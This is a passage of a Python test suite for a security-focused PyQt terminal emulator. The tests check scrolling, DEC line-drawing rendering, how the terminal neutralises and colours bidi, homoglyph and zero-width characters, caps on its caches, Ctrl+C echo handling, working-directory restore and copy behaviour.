    for _i in range(200):
        _rt._feed_stream(('rsb-%d\r\n' % _i).encode())
    _rt._render_tui()
    _rbar = _rt.verticalScrollBar()
    _rbar.setValue(_rbar.maximum() // 2)
    _rt.resize(700, 450)               # resize while scrolled up: must not crash
    pump(40)
    ok(_rt.document().blockCount() >= 1, 'resizing while scrolled up does not crash')

    # Bug #64: the primary-screen grid trims trailing blank rows below the cursor,
    # so the document ends at the last output line (no scrolling into empty space).
    _pad = SecureTerminal(command='/bin/cat', tui=True)
    _pad.resize(700, 400)
    _pad.show()
    pump(40)
    _pad.apply_mode('show')
    _pad._feed_stream(b'\x1b[2J\x1b[1;1Hline1\r\nline2\r\nprompt$ ')
    _pad._render_tui()
    ok(_pad.toPlainText().split('\n')[-1].startswith('prompt$'),
       'TUI document ends at the last output line, no blank grid padding below it')
    ok(_pad.document().blockCount() <= 4,
       'TUI grid is trimmed to the cursor row, not the full screen height')
    _pad.close()

    # Bug #65: TUI auto-scrolls to the newest output when already at the bottom, but
    # does NOT yank a scrolled-up view back down.
    _fol = SecureTerminal(command='/bin/cat', tui=True)
    _fol.resize(700, 300)
    _fol.show()
    pump(40)
    for _i in range(80):
        _fol._feed_stream(('scrollback-%d\r\n' % _i).encode())
    _fol._render_tui()
    _fbar = _fol.verticalScrollBar()
    ok(_fbar.maximum() > 0, 'TUI scrollbar has range (content exceeds the viewport)')
    _fbar.setValue(_fbar.maximum())
    _fol._feed_stream(b'newest-line\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _fbar.maximum(),
       'TUI auto-scrolls to the newest output when already at the bottom')
    _fbar.setValue(_fbar.maximum() // 2)
    _held = _fbar.value()
    _fol._feed_stream(b'more-output\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _held,
       'TUI does not yank a scrolled-up view back to the bottom')
    # Regression (operator report): a ONE-line scroll-up must not be yanked back either. The
    # old `>= maximum - 2` tolerance mistook value==maximum-1 for "at bottom" and snapped the
    # view to the tail on the next frame (the reported scroll flicker). FAILS on the old code:
    # value would return to maximum.
    _fbar.setValue(_fbar.maximum())          # re-enter auto-follow
    _fol._render_tui()
    _one_up = _fbar.maximum() - 1
    _fbar.setValue(_one_up)                  # user wheels up a single line
    _fol._feed_stream(b'and-more\r\n')       # new output keeps arriving
    _fol._render_tui()
    ok(_fbar.value() < _fbar.maximum(),
       'a one-line scroll-up is not yanked back to the bottom (no scroll flicker)')
    # ...and returning to the very bottom RESUMES auto-follow.
    _fbar.setValue(_fbar.maximum())
    _fol._feed_stream(b'tail-again\r\n')
    _fol._render_tui()
    eq(_fbar.value(), _fbar.maximum(),
       'returning to the bottom resumes TUI auto-follow')
    _fol.close()

# --- TUI grid: DEC line-drawing renders, and neutralized cells are risk-coloured -
# pyte's ByteStream runs in UTF-8 mode, where it treats an `ESC ( 0` DEC
# line-drawing designation as a no-op, so a curses program's box borders used to
# arrive as literal `lqqqk` text. _Utf8CharsetByteStream re-arms the designation
# (still UTF-8-decoding), so the grid draws the real box-drawing glyphs.
from secure_terminal.terminal import (_CP_PROP as _CPP, BOX as _BX,   # noqa: E402
                                       _GridRow as _GR)


def _cell_fmt(term, idx):
    """The effective (QTextCharFormat, source codepoint) painting the grid cell at
    document position idx: from the block's _GridRow in TUI grid mode (the layout
    formats the highlighter paints are not queryable via charFormat), else the
    char format in CLI line mode."""
    _blk = term.document().findBlock(idx)
    _off = idx - _blk.position()
    _data = _blk.userData()
    if isinstance(_data, _GR):
        for _start, _length, _fmt, _cp in _data.runs:
            if _start <= _off < _start + _length:
                return _fmt, _cp
    _c = QTextCursor(term.document())
    _c.setPosition(idx)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    _f = _c.charFormat()
    return _f, _f.property(_CPP)


def _grid_cell(term, idx):
    """(display char, source codepoint tag, foreground name) for a grid cell.
    selectedText() is the RAW document glyph (the box placeholder), not the
    export form (toPlainText maps the box back to '_')."""
    _c = QTextCursor(term.document())
    _c.setPosition(idx)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    _fmt, _cp = _cell_fmt(term, idx)
    return _c.selectedText(), _cp, _fmt.foreground().color().name()


# Q1 SHOW mode: `ESC ( 0 lqk ESC ( B` becomes real box-drawing glyphs, not `lqk`.
_dsh = SecureTerminal(command='/bin/cat', tui=True)
_dsh.apply_mode('show')
_dsh.resize(600, 300)
_dsh.show()
pump(60)
_dsh._feed_stream(b'A\x1b(0lqk\x1b(BZ\r\n')   # 'A'/'Z' plain program cells bracket the box-drawing
_dsh._render_tui()
pump(30)
_dshtxt = _dsh.toPlainText()
ok(any(0x2500 <= ord(c) <= 0x257F for c in _dshtxt),
   'Q1 show: DEC line-drawing (ESC(0 lqk) renders real box-drawing glyphs')
ok('lqk' not in _dshtxt, 'Q1 show: the DEC letters are no longer shown as literal ASCII')
# a structural cell takes the program-SGR branch (a COPY of the cached _pyte_format
# format, tagged with _CP_PROP); the copy must not pollute the shared cached format,
# or a later plain-ASCII cell of the same SGR would falsely report the box codepoint.
_zi = _dshtxt.index('Z')                    # a default-SGR ASCII cell AFTER the box-drawing
ok(_grid_cell(_dsh, _zi)[1] is None,
   'a plain ASCII cell after a structural cell carries no codepoint tag (shared format not polluted)')
# a shown box-drawing glyph is structure, not a deception (it cannot pose as ASCII,
# hide or reorder), so it renders as its real glyph in the PROGRAM's OWN colour --
# NOT a risk-class tint -- while still carrying its source codepoint for inspection.
# The plain 'A' cell gives the program's colour to compare against.
_ai = _dshtxt.index('A')
_ach, _acp, _afg = _grid_cell(_dsh, _ai)
_bdi = next(i for i, c in enumerate(_dshtxt) if 0x2500 <= ord(c) <= 0x257F)
_bdch, _bdcp, _bdfg = _grid_cell(_dsh, _bdi)
ok(0x2500 <= ord(_bdch) <= 0x257F, 'Q1 show: the cell holds the real box-drawing glyph')
eq(_bdcp, ord(_bdch), 'Q2 show: a shown box-drawing glyph carries its own codepoint (inspectable)')
eq(_bdfg.lower(), _afg.lower(),
   'Q2 show: a shown box-drawing glyph wears the PROGRAM colour (structural, like a real terminal)')
ok(_bdfg.lower() != mark_fg(_dsh, 'nonascii').lower(),
   'Q2 show: a shown box-drawing glyph is NOT painted the non-ASCII risk colour')
_dsh.close()
# #7: a child announcing UTF-8 mode (ESC%G / ESC%8) must NOT re-break DEC line-drawing. pyte's
# base ByteStream.select_other_charset flips use_utf8 back True for ESC%G, which re-arms the
# "ESC(0 is a no-op" path so borders render as literal 'lqk' again (GNU screen announces UTF-8
# this way). _Utf8CharsetByteStream overrides it to a no-op, keeping the charset path armed.
_dg = SecureTerminal(command='/bin/cat', tui=True)
_dg.apply_mode('show')
_dg.resize(600, 300)
_dg.show()
pump(60)
_dg._feed_stream(b'\x1b%GA\x1b(0lqk\x1b(BZ\r\n')   # ESC%G (announce UTF-8) THEN the line-drawing
_dg._render_tui()
pump(30)
_dgtxt = _dg.toPlainText()
ok(any(0x2500 <= ord(c) <= 0x257F for c in _dgtxt),
   '#7: a UTF-8-mode announce does not disarm DEC line-drawing -- box-drawing still renders')
ok('lqk' not in _dgtxt, '#7: after a UTF-8-mode announce the DEC letters are still not literal ASCII')
_dg.close()

# Q2 show: a homoglyph shown as its glyph wears the LOUDER confusable colour, so a
# Cyrillic 'a' posing as Latin stands out even while its glyph is readable.
_hsh = SecureTerminal(command='/bin/cat', tui=True)
_hsh.apply_mode('show')
_hsh.resize(600, 300)
_hsh.show()
pump(60)
_hsh._feed_stream(('p' + chr(0x0430) + 'y\r\n').encode())        # Cyrillic small a
_hsh._render_tui()
pump(30)
_hi = _hsh.toPlainText().index(chr(0x0430))
_hch, _hcp, _hfg = _grid_cell(_hsh, _hi)
eq(_hcp, 0x0430, 'Q2 show: a shown homoglyph carries its source codepoint')
eq(_hfg.lower(), mark_fg(_hsh, 'confusable').lower(),
   'Q2 show: a shown homoglyph is tinted with the louder confusable risk colour')
_hsh.close()

# Q1 BOX mode: DEC line-drawing is neutralized to the box placeholder (strict), and
# Q2: that neutralized cell is coloured by risk class and carries its source cp.
_dbx = SecureTerminal(command='/bin/cat', tui=True)
_dbx.apply_mode('box')
_dbx.resize(600, 300)
_dbx.show()
pump(60)
_dbx._feed_stream(b'\x1b(0lqqk\x1b(B\r\n')                 # repeated q -> repeated cell
_dbx._render_tui()
pump(30)
_dbxtxt = _dbx.toPlainText()
ok('lqqk' not in _dbxtxt, 'Q1 box: DEC line-drawing is not shown as literal ASCII')
ok('_' in _dbxtxt, 'Q1 box: DEC line-drawing is neutralized (exported as _)')
_bi = _dbxtxt.index('_')
_disp, _cp, _fg = _grid_cell(_dbx, _bi)
eq(_disp, _BX, 'Q2 box: the neutralized cell is the box placeholder glyph')
ok(_cp is not None and 0x2500 <= _cp <= 0x257F,
   'Q2 box: the box cell carries the SOURCE box-drawing codepoint (not U+25A1)')
eq(_fg.lower(), mark_fg(_dbx, 'nonascii').lower(),
   'Q2 box: a boxed box-drawing cell wears the non-ASCII risk colour')
_dbx.close()

# The structural contrast-guard bypass is Show-ONLY. In a strict mode a structural glyph
# is NEUTRALIZED to a placeholder, so the guard must stay -- else a program that painted
# it fg==bg would render the placeholder invisible, defeating the neutralization the strict
# mode exists for. Box mode + markings OFF (the program-SGR branch) + a red-on-red full
# block. FAILS pre-fix, where the bypass came from the source glyph regardless of display.
def _cell_fg_bg(term, idx):
    _cf, _ = _cell_fmt(term, idx)
    _fg = _cf.foreground().color().name().lower()
    _bg = (_cf.background().color().name().lower()
           if _cf.background().style() != Qt.BrushStyle.NoBrush else None)
    return _fg, _bg


_RED_ON_RED = b'\x1b[38;2;200;0;0;48;2;200;0;0m' + '\u2588'.encode() + b'\x1b[0m\r\n'
_sgb = SecureTerminal(command='/bin/cat', tui=True)
_sgb.apply_mode('box')
_sgb.apply_markings(False)          # the program-SGR branch (no risk tint)
_sgb.apply_colors(True)
_sgb.resize(600, 300)
_sgb.show()
pump(60)
_sgb._feed_stream(_RED_ON_RED)
_sgb._render_tui()
pump(30)
_sbfg, _sbbg = _cell_fg_bg(_sgb, _sgb.toPlainText().index('_'))
ok(_sbfg != _sbbg,
   'box mode: a neutralized structural glyph keeps the contrast guard (fg==bg cannot hide the placeholder)')
_sgb.close()

# Cache invalidation: a Show-mode structural cell caches the bypass (fg==bg allowed, the
# glyph is displayed); toggling to a strict mode must re-clamp it -- _rerender drops the
# format caches, which are keyed by codepoint + SGR, not by mode.
_sgc = SecureTerminal(command='/bin/cat', tui=True)
_sgc.apply_mode('show')
_sgc.apply_markings(False)
_sgc.apply_colors(True)
_sgc.resize(600, 300)
_sgc.show()
pump(60)
_sgc._feed_stream(_RED_ON_RED)
_sgc._render_tui()
pump(30)
_scfg_show, _scbg_show = _cell_fg_bg(_sgc, next(
    i for i, ch in enumerate(_sgc.toPlainText()) if ch == '\u2588'))
eq(_scfg_show, _scbg_show,
   'show mode: a displayed structural glyph keeps its program fg==bg (colour ramp intact)')
_sgc.apply_mode('box')
pump(30)
_scfg_box, _scbg_box = _cell_fg_bg(_sgc, _sgc.toPlainText().index('_'))
ok(_scfg_box != _scbg_box,
   'toggling Show->box re-clamps the neutralized structural cell (format caches cleared)')
_sgc.close()

# Q2 by-class colours: a bidi override, a homoglyph and a zero-width each get their
# own class colour + inspectable codepoint in the grid, exactly as CLI box mode.
for _payload, _wantcp, _wantcls in ((chr(0x202E), 0x202E, 'bidi'),
                                    (chr(0x0430), 0x0430, 'confusable'),
                                    (chr(0x200B), 0x200B, 'invisible')):
    _q2 = SecureTerminal(command='/bin/cat', tui=True)
    _q2.apply_mode('box')
    _q2.resize(600, 300)
    _q2.show()
    pump(60)
    _q2._feed_stream(('x' + _payload + 'y\r\n').encode())
    _q2._render_tui()
    pump(30)
    _idx = _q2.toPlainText().index('_')
    _d, _c2, _fg2 = _grid_cell(_q2, _idx)
    eq(_c2, _wantcp, 'Q2 grid: %s box carries its source codepoint' % _wantcls)
    eq(_fg2.lower(), mark_fg(_q2, _wantcls).lower(),
       'Q2 grid: %s box wears the %s risk colour' % (_wantcls, _wantcls))
    # _cp_at parity: hovering the box cell resolves the REAL character, not U+25A1
    _hc = QTextCursor(_q2.document())
    _hc.setPosition(_idx)
    eq(_q2._cp_at(_q2.cursorRect(_hc).center()), _wantcp,
       'Q2 grid: hover on the %s box resolves the real codepoint (not the box glyph)' % _wantcls)
    _q2.close()

# markings OFF: a neutralized grid cell wears NO risk-class colour (it falls back
# to the program's own SGR), but it STILL carries the source codepoint -- so hover/
# inspection identifies the real character in Box/Detail/Reveal even with markings
# off, at parity with the CLI line renderer (which tags the codepoint regardless).
_moff = SecureTerminal(command='/bin/cat', tui=True)
_moff.apply_mode('box')
_moff.apply_markings(False)
_moff.resize(600, 300)
_moff.show()
pump(60)
_moff._feed_stream(('x' + chr(0x202E) + 'y\r\n').encode())
_moff._render_tui()
pump(30)
_mv = _grid_cell(_moff, _moff.toPlainText().index('_'))
eq(_mv[1], 0x202E,
   'Q2 markings off: a neutralized grid cell still carries the source codepoint (CLI parity)')
ok(_mv[2].lower() not in {s['fg'].lower()
                          for s in _moff.MARKING_COLORS[_moff._theme].values()},
   'Q2 markings off: but wears no risk-class colour (program SGR only)')
_moff.close()

# the marking-format caches are ADMISSION-CAPPED: a flood of distinct non-ASCII
# codepoints (each boxed) cannot grow _grid_mark_cache without bound (the same bound
# sanitize._is_mark uses), so a long-lived tab cannot leak one QTextCharFormat per
# codepoint for the whole session. (CodeRabbit PR #4.)
from secure_terminal.terminal import _MARK_CACHE_MAX                 # noqa: E402


class _FakeCell:                                    # minimal pyte-cell stand-in
    __slots__ = ('data', 'fg', 'bg', 'bold', 'reverse', 'underscore')

    def __init__(self, ch):
        self.data = ch
        self.fg = self.bg = 'default'
        self.bold = self.reverse = self.underscore = False


_cap = SecureTerminal(command='/bin/cat', tui=True)
_cap.apply_mode('box')
for _i in range(_MARK_CACHE_MAX + 300):
    _cap._grid_cell_format(_FakeCell(chr(0x3400 + _i)), _BX)     # distinct CJK, boxed
ok(len(_cap._grid_mark_cache) <= _MARK_CACHE_MAX,
   'grid marking cache is admission-capped under a distinct-codepoint flood (size %d)'
   % len(_cap._grid_mark_cache))
_cap.close()

# _fmt_cache is keyed by (fg, bg, ...) with TRUECOLOR colours, so untrusted SGR spam
# would grow it toward the 2^48 colour space (~178MB observed) -- it is admission-capped
# like the marking caches so a flood cannot leak one QTextCharFormat per colour forever.
_capf = SecureTerminal(command='/bin/cat')
for _i in range(_MARK_CACHE_MAX + 300):
    _fc = _FakeCell('x')
    _fc.fg = '%06x' % _i                # a distinct truecolor foreground each time
    _capf._pyte_format(_fc)
ok(len(_capf._fmt_cache) <= _MARK_CACHE_MAX,
   'the cell-format cache is admission-capped under a truecolor SGR flood (size %d)'
   % len(_capf._fmt_cache))
_capf.close()

# COR-5: an AIXTERM bright-background SGR (100-107) must render a genuinely BRIGHT bg, not
# the dim base. pyte encodes it as base-name bg + bold=True, so the fork disentangles it:
# a bright bg name (no phantom bold that would brighten the fg / bold the font).
if tui_available():
    _bb = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_bb, b'\x1b[107mX')            # bright white background
    _bcell = _bb._screen.buffer[0][0]
    eq(_bcell.bg, 'brightwhite',
       'COR-5: a bright-bg SGR sets a bright bg name (base rendered the dim white)')
    ok(not _bcell.bold,
       'COR-5: a bright-bg-only SGR sets NO phantom bold (no fg-brighten / bold font)')
    _bg_bright = _bb._pyte_qcolor('brightwhite', None)
    ok(_bg_bright is not None
       and _bb._pyte_format(_bcell).background().color().name() == _bg_bright.name(),
       'COR-5: the bright-bg cell renders from the +8 bright palette')
    # order-correctness: a normal bg AFTER a bright-bg wins; a bright-bg after reset wins
    feed_output(_bb, b'\x1b[107;44mY')         # bright-bg then normal blue bg -> blue wins
    eq(_bb._screen.buffer[0][1].bg, 'blue',
       'COR-5: a normal bg after a bright-bg overrides it (in-order)')
    _bb.close()
    # an INCOMPLETE extended-bg selector (48 with no 5;N / 2;R;G;B) must NOT clear a
    # preceding valid bright-bg: only a COMPLETE 48 is a real bg. Pre-fix `101;48`
    # cleared bright_bg unconditionally -> default bg instead of the bright-red. Fresh
    # cell so the pre-fix result is an unambiguous 'default', not a leftover bg.
    _b48 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_b48, b'\x1b[101;48mZ')        # bright-red bg, then a bare (incomplete) 48
    eq(_b48._screen.buffer[0][0].bg, 'brightred',
       'COR-5: an incomplete 48 selector leaves a preceding bright-bg intact (101;48)')
    _b48.close()
    # 38/48 EXTENDED colours: their following params are colour DATA, not opcodes. A component
    # in 100-107 must NOT be misread as a bright-bg code (the base of this fix, 23ff606, did:
    # 38;5;101 set bg=brightred and truncated the fg). Feed each on its own fresh cell.
    _xc = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_xc, b'\x1b[38;5;101mA')       # 256-colour fg, index 101
    _a = _xc._screen.buffer[0][0]
    ok(_a.bg == 'default' and _a.fg != 'default',
       'COR-5: 38;5;101 sets a 256-colour fg, leaves bg default (101 not read as bright-bg)')
    _xc2 = SecureTerminal(command='/bin/cat', tui=True)
    feed_output(_xc2, b'\x1b[48;2;100;101;102mB')   # truecolour bg 0x646566
    eq(_xc2._screen.buffer[0][0].bg, '646566',
       'COR-5: 48;2;R;G;B sets a truecolour bg (components not read as bright-bg)')
    # branch coverage for the param consumer: attr==48 mode==5, a malformed 38 (no mode), a
    # truncated 38;5 (no index), and a non-5/2 mode (consumes nothing) -- none may crash.
    for _seq in (b'\x1b[48;5;15mC', b'\x1b[38mD', b'\x1b[38;5mE', b'\x1b[38;9;44mF'):
        _xe = SecureTerminal(command='/bin/cat', tui=True)
        feed_output(_xe, _seq)
        ok(isinstance(_xe.toPlainText(), str),
           'COR-5: extended-colour param consumer handles %r without crashing' % _seq)
        _xe.close()
    _xc.close(); _xc2.close()

# Security regression (codex/agy, PR #5 review): a pyte cell can hold a box-drawing
# base PLUS a hidden dangerous code point (bidi / zero-width), which tui_cell
# neutralizes to the box placeholder. The Show-mode structural exemption must NOT fire
# on such a cell -- the box must wear the RISK tint of the real hazard and stay
# inspectable AS it, not be waved through as benign structure because its first code
# point is a line. marking_cp_for_cell now resolves the cell to the worst code point.
_sec = SecureTerminal(command='/bin/cat', tui=True)
_sec.apply_mode('show')
_bidi_fmt = _sec._grid_cell_format(_FakeCell(chr(0x2500) + chr(0x202E)), _BX)
eq(_bidi_fmt.property(_CPP), 0x202E,
   'grid: a box-drawing+bidi cell resolves to the BIDI codepoint (the real hazard)')
eq(_bidi_fmt.foreground().color().name().lower(), mark_fg(_sec, 'bidi').lower(),
   'grid: a neutralized box+bidi cell wears the bidi RISK colour, not the program SGR')
# a confusable box-drawing diagonal (U+2571 -> "/") shown in Show mode keeps its
# confusable tint, not the structural program-colour pass.
_diag_fmt = _sec._grid_cell_format(_FakeCell(chr(0x2571)), chr(0x2571))
eq(_diag_fmt.foreground().color().name().lower(), mark_fg(_sec, 'confusable').lower(),
   'grid: a confusable box-drawing diagonal wears the confusable risk colour')
_sec.close()

# Ctrl+C is echoed locally as ^C (transparency: make the invisible visible) and
# de-duped against a shell that also echoes it (bash's readline), so the user
# always sees exactly one ^C.
cc = SecureTerminal(command='/bin/cat')
cc._feed_line('prompt$ ')
key(cc, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
ok(cc.toPlainText().endswith('^C'), 'Ctrl+C is locally echoed as ^C')
_dedup = cc._absorb_caret('^C\r\nprompt$ ')          # bash's own ^C, right after
ok(not _dedup.startswith('^C'), 'a shell duplicate ^C in the next output is absorbed')
cc._feed_line(_S.render_output(_dedup, cc.current_mode()))
eq(cc.toPlainText().count('^C'), 1, 'exactly one ^C after Ctrl+C + shell echo (no double)')
cz = SecureTerminal(command='/bin/cat')
cz._feed_line('prompt%')
key(cz, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
_z = cz._absorb_caret('\r\nprompt%')                 # a shell (zsh) that echoes nothing
ok('^C' not in _z, 'nothing removed when the shell does not echo ^C')
eq(cz.toPlainText().count('^C'), 1, 'local ^C preserved for a non-echoing shell')
# real child output that merely CONTAINS ^C after a leading PRINTABLE char must not
# be corrupted -- only a caret leading the chunk (optionally after CR/LF) is a shell
# echo; a program printing "a^C-note" right after the interrupt keeps its bytes
cd2 = SecureTerminal(command='/bin/cat')
key(cd2, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
eq(cd2._absorb_caret('a^C-note'), 'a^C-note',
   'a ^C after a printable char is real output, not absorbed')
# but a genuine shell echo after only a leading CR/LF is still absorbed
cd3 = SecureTerminal(command='/bin/cat')
key(cd3, Qt.Key.Key_C, mods=Qt.KeyboardModifier.ControlModifier)
ok('^C' not in cd3._absorb_caret('\r\n^Cnext'),
   'a shell ^C after a leading CR/LF is still absorbed')

# a restored session tab spawns its shell in the SAVED working directory (cwd),
# so restore returns you to where you were (bug: pwd was not restored).
import tempfile as _tfcwd                                  # noqa: E402


def _wait_cwd(pid, target, tries=60):
    _rt = os.path.realpath(target)
    for _ in range(tries):
        try:
            if os.path.realpath(os.readlink('/proc/%d/cwd' % pid)) == _rt:
                return True
        except OSError:
            ## /proc/<pid>/cwd is not readable until the forked child has
            ## chdir'd and exec'd; poll on, `tries` is the timeout.
            pass
        pump(10)                       # let the forked child chdir + exec
    return False


_cwd_dir = _tfcwd.mkdtemp(prefix='st-cwd-')
_cwt = SecureTerminal(command='/bin/cat', cwd=_cwd_dir)
ok(_wait_cwd(_cwt._pid, _cwd_dir), 'a spawned shell starts in the requested cwd')
eq(os.path.realpath(_cwt.shell_cwd()), os.path.realpath(_cwd_dir),
   'shell_cwd reports the shell working directory')
_cwt.close()
# a vanished cwd must not break the spawn -- it falls back to the inherited dir
_gone = _tfcwd.mkdtemp(prefix='st-gone-')
os.rmdir(_gone)
_cwg = SecureTerminal(command='/bin/cat', cwd=_gone)
pump(30)
ok(_cwg._pid is not None, 'a vanished saved cwd still spawns a shell (fallback)')
_cwg.close()
# shell_cwd returns '' when the shell pid is gone / unreadable (defensive branch)
_cwt2 = SecureTerminal(command='/bin/cat')
_realpid = _cwt2._pid
_cwt2._pid = 2 ** 30           # a pid that does not exist -> os.readlink raises
eq(_cwt2.shell_cwd(), '', 'shell_cwd returns empty when the shell pid is unreadable')
_cwt2._pid = _realpid          # restore so close() reaps the real child
_cwt2.close()
# regression: output that fills the reported width hard-wraps (real autowrap), so
# a shell's width-padded end-of-line marker (zsh PROMPT_SP / PROMPT_EOL_MARK) and
# the following prompt do not collapse onto one logical line -- which lost the
# last line of a file printed without a trailing newline.
aw = SecureTerminal(command='/bin/cat')
aw._cols = 40
aw._feed_line('END}' + '%' * 40 + '\rprompt$ ')      # }, a width-filling marker, CR, prompt
_awlines = aw.toPlainText().split('\n')
ok(any('END}' in ln for ln in _awlines),
   'content before a width-filling marker survives (autowrap, not collapse)')
ok(len(_awlines) >= 2,
   'output filling the reported width hard-wraps instead of collapsing under a bare CR')
# and a soft-autowrapped line copies JOINED (no spurious newline at the wrap),
# like a real terminal -- the wrap-continuation block is marked and joined.
cwp = SecureTerminal(command='/bin/cat')
cwp._cols = 5
cwp._feed_line('abcdefgh\n')                          # 8 chars at width 5 -> wraps
cwp.selectAll()
_copied = cwp.createMimeDataFromSelection().text()
ok('abcdefgh' in _copied, 'a soft-wrapped line copies joined (no wrap newline)')
ok('abcde\nfgh' not in _copied, 'the wrap point is not a newline in the copy')
# copying a slice that starts AFTER an astral char must land on the right cell:
# QTextCursor positions are UTF-16 units (an astral glyph is two), so a Python
# str-offset slice would mis-cut. Show mode keeps the glyph as one code point.
cap = SecureTerminal(command='/bin/cat')
cap.apply_mode('show')
cap._feed_line('\U0001f600X\n')                      # emoji (2 UTF-16 units) + X
_capcur = cap.textCursor()
_capcur.setPosition(2)                                # just past the emoji
_capcur.setPosition(3, QTextCursor.MoveMode.KeepAnchor)
cap.setTextCursor(_capcur)
ok(cap.createMimeDataFromSelection().text() == 'X',
   'a selection after an astral char copies the right cell (UTF-16 aware)')

# regression (box<->show reflow): a neutralized cell is ONE narrow box, but the
# glyph it stands for can be WIDER (a CJK/emoji renders ~1.7x a plain cell in the
# shipped Hack font). Under the old pixel WidgetWidth wrap a line that fit in Box
# re-wrapped in Show and the wide glyph jumped to the next line on a mode toggle.
# NoWrap makes the terminal's own column model (feed_line_edits at self._cols) the
# SOLE wrap authority -- mode-independent -- so the glyph keeps its line/column.
_rf = SecureTerminal(command='/bin/cat')
_rf.document().setDocumentMargin(0)
_rffm = _rf.fontMetrics()
_rfcw = _rffm.horizontalAdvance('M')
_rfwide = _rffm.horizontalAdvance('\U0001f600')       # emoji: wider than a cell
_rfN = 10
# a viewport BETWEEN the box-line width (N+1 narrow cells) and the show-line width
# (N narrow + one wide glyph): the old pixel wrap broke Show here but not Box.
_rfvw = int(_rfN * _rfcw + (_rfwide + _rfcw) / 2)
_rf.resize(_rfvw + 4, 300)
_rf.show()
APP.processEvents()
while _rf.viewport().width() > _rfvw and _rf.width() > 20:
    _rf.resize(_rf.width() - 1, 300)
    APP.processEvents()
_rf._cols = 500                                       # do not hard-wrap this short line
_rf._mode = 'box'
_rf._feed_line('M' * _rfN + '\U0001f600')
APP.processEvents()


def _rf_visual_lines(t):
    lay = t.document().documentLayout()
    return round(lay.blockBoundingRect(t.document().begin()).height()
                 / t.fontMetrics().height())


_rf_box_lines = _rf_visual_lines(_rf)
_rf.apply_mode('show')
APP.processEvents()
_rf_show_lines = _rf_visual_lines(_rf)
ok(_rfwide <= _rfcw or (_rf_box_lines == 1 and _rf_show_lines == 1),
   'box<->show keeps a wide glyph on the same line -- no reflow (NoWrap authority)')
_rf.close()

# regression (Fix #4): CLI paints are DEBOUNCED to ~60fps by a single-shot timer,
# so a live read does not rebuild the document immediately -- but a save/teardown
# must FLUSH the pending paint or the last unpainted line is lost.
_db = SecureTerminal(command='/bin/cat')
_db._mode = 'show'
_dbr, _dbw = os.pipe()
_db._fd = _dbr
os.write(_dbw, b'debounced-last-line')
os.close(_dbw)
_db._on_readable()                                    # live read -> deferred paint
_db._fd = None
os.close(_dbr)
ok(_db.document().toPlainText() == '',
   'a live CLI read debounces the paint (the Qt document is not rebuilt yet)')
ok('debounced-last-line' in _db.transcript_text(),
   'transcript_text flushes the pending paint, so a save never misses the last line')
_db.close()
# A read notifier can fire AFTER teardown closed the fd (_fd set to None): _on_readable
# must be a no-op then, not os.read(None) -> TypeError (an uncaught type error that
# BlockingIOError/OSError do not catch).
_rn = SecureTerminal(command='/bin/cat')
_rn._fd = None
_rn_raised = False
try:
    _rn._on_readable()
except Exception:                                     # noqa: BLE001
    _rn_raised = True
ok(not _rn_raised,
   '_on_readable is a no-op when the fd is already closed (teardown-race guard)')
_rn.close()
# shutdown flushes too, so the last line survives teardown
_db2 = SecureTerminal(command='/bin/cat')
_db2._mode = 'show'
_dbr2, _dbw2 = os.pipe()
_db2._fd = _dbr2
os.write(_dbw2, b'teardown-last-line')
os.close(_dbw2)
_db2._on_readable()
_db2._fd = None
os.close(_dbr2)
_db2.shutdown()
ok('teardown-last-line' in _db2.document().toPlainText(),
   'shutdown flushes the pending paint, so the last line survives teardown')
# gap1 (ai-review): the PRIMARY-selection / drag path strips to ASCII even in Show
# mode -- a homoglyph must not reach a middle-click paste / drop target unreviewed
# (the copy review only covers Ctrl+C).
_prim = SecureTerminal(command='/bin/cat')
_prim.apply_mode('show')
_prim._feed_line('pa' + chr(0x0430) + 'l\n')          # Cyrillic 'a' homoglyph kept in Show
_pcur = _prim.textCursor()
_pcur.setPosition(0)
_pcur.setPosition(4, QTextCursor.MoveMode.KeepAnchor)
_prim.setTextCursor(_pcur)
ok(all(ord(c) < 128 for c in _prim.createMimeDataFromSelection().text()),
   'gap1: the PRIMARY-selection/drag path strips non-ASCII (no unreviewed homoglyph)')
_prim.close()
# --- inspect popups: a marked character carries its source codepoint, so the
# hover tooltip and the double-click popup can describe it in EVERY mode ---------
from secure_terminal.terminal import _CP_PROP            # noqa: E402
from PyQt6.QtWidgets import QLabel, QPushButton           # noqa: E402
from PyQt6.QtGui import QGuiApplication                   # noqa: E402


def _fmt_cp(term, index):
    _c = QTextCursor(term.document())
    _c.setPosition(index)
    _c.movePosition(QTextCursor.MoveOperation.NextCharacter,
                    QTextCursor.MoveMode.KeepAnchor)
    return _c.charFormat().property(_CP_PROP)


ins = SecureTerminal(command='/bin/cat')
ins.apply_mode('box')
ins._append('a' + chr(0x202E) + 'b')                     # RLO between two ASCII
eq(ins.toPlainText(), 'a_b', 'box shows the RLO override as "_"')
eq(_fmt_cp(ins, 1), 0x202E, 'even the box "_" carries the source codepoint (RLO)')
inr = SecureTerminal(command='/bin/cat')
inr.apply_mode('reveal')
inr._append(chr(0x20AC))                                 # euro sign
eq(_fmt_cp(inr, 0), 0x20AC, 'a reveal badge carries the source codepoint (euro)')
# _cp_at (the real hover/click hit-test) recovers it from a viewport point. The
# badge is 8 cells wide and every cell carries the tag, so a mid-badge point is a
# stable target regardless of exact glyph metrics.
inr.resize(600, 200)
inr.show()
pump(30)
_mid = QTextCursor(inr.document())
_mid.setPosition(4)                                      # inside "<U+20AC>"
_badge_pt = inr.cursorRect(_mid).center()
eq(inr._cp_at(_badge_pt), 0x20AC, '_cp_at recovers the codepoint under a point (reveal)')
# and in SHOW mode a readable glyph keeps no tag but IS its own codepoint: _cp_at
# falls back to the character itself (three copies give a stable mid target).
insh = SecureTerminal(command='/bin/cat')
insh.apply_mode('show')
insh._append(chr(0x0416) * 3)                            # Cyrillic Zhe, printable
insh.resize(600, 200)
insh.show()
pump(30)
_shcur = QTextCursor(insh.document())
_shcur.setPosition(1)
